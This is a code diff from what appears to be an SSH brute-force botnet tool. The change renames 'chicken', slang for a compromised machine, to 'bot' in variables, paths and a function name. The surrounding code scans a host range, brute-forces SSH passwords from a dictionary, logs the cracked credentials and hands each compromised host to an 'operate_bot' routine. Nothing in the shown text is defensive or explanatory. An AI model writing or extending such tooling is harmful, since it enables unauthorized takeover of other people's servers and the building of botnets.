@@ -18,8 +18,8 @@ def start_chu_brute(brute_type, host, user, dictionary, *, thread_num=gv.MAX_CON
     :return:
     """
     if brute_type is 'ssh':
-        # 指定chicken信息存储文件
-        gv.chicken_info_file = host.replace('/', 'mask') + '.txt'
+        # 指定bot信息存储文件
+        gv.bot_info_file = host.replace('/', 'mask') + '.txt'
 
         print('[+] Start scan host ' + host)
 
@@ -29,7 +29,7 @@ def start_chu_brute(brute_type, host, user, dictionary, *, thread_num=gv.MAX_CON
             print('[*] Start brute ', open_host_info['ip'])
 
             brute_ret = brute(open_host_info['ip'], user, dictionary, connections=thread_num)
-            save_info(mode='scan_log', filename=gv.CHICKEN_PATH + 'scan.log', info=brute_ret)
+            save_info(mode='scan_log', filename=gv.BOT_PATH + 'scan.log', info=brute_ret)
             if brute_ret['key'] is None:
                 continue
 
@@ -38,7 +38,7 @@ def start_chu_brute(brute_type, host, user, dictionary, *, thread_num=gv.MAX_CON
                   'password: ' + brute_ret['key'])
 
             time.sleep(gv.OPERATE_INTERVAL)
-            operate_chicken(brute_ret)
+            operate_bot(brute_ret)
 
         print('[+] End scan and brute.')
 
@@ -66,5 +66,5 @@ if __name__ == "__main__":
     #     print(info)
     #     if file_info[info]['key'] == 'None':
     #         continue
-    #     # operate_chicken(file_info[info])
+    #     # operate_bot(file_info[info])
     #     print(file_info[info])
